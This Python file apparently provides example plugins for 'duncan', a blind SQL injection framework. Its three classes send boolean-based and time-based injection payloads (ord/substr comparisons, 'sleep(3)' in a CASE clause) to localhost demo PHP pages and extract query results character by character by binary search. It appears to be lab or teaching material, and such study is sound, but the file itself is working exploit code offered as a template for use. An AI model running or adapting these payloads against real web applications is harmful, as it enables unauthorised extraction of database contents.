#!/usr/bin/env python

import duncan
import requests

class SimpleDuncan(duncan.Duncan): # Inherit from Duncan
	def decide(self,guess): # Implement decide()
		# Construct your query to split the search space into two at guess
		# self._query holds the query to be executed from the command line
		# self._pos is the position of the character to be guessed
		url="http://localhost/demo/sqli/blind.php?p=1 and ord(substr((%s),%d,1))<%d" % (self._query,self._pos,guess)
		self.debug(6,url) # You can use the parents method for debug output
		r=requests.get(url) 
		
		if r.content.find(':)')>-1:
			return True
		else:
			return False

class SimpleTimeBasedDuncan(duncan.DuncanTime):
	def decide(self,guess):
		import time

		self._rttmax=3 # this hint can be useful
		self._rttmin=1

		t0=time.time()
		url="http://localhost/demo/sqli/time.php?p=1 and case when ord(substr((%s),%d,1))<%d then sleep(3) else 1 end" % (self._query,self._pos,guess)
		self.debug(6,url)
		r=requests.get(url)
		t1=time.time()
		self.debug(6, "Guess: %d, Time: %f" % (guess,t1-t0))
		if t1-t0>2:
			return True
		else:
			return False

class NaiveTimeBasedDuncan(duncan.Duncan):
	def decide(self,guess):
		import time
		t0=time.time()
		url="http://localhost/demo/sqli/time.php?p=1 and case when ord(substr((%s),%d,1))<%d then sleep(3) else 1 end" % (self._query,self._pos,guess)
		self.debug(6,url)
		r=requests.get(url)
		t1=time.time()
		self.debug(6, "Guess: %d, Time: %f" % (guess,t1-t0))
		if t1-t0>2:
			return True
		else:
			return False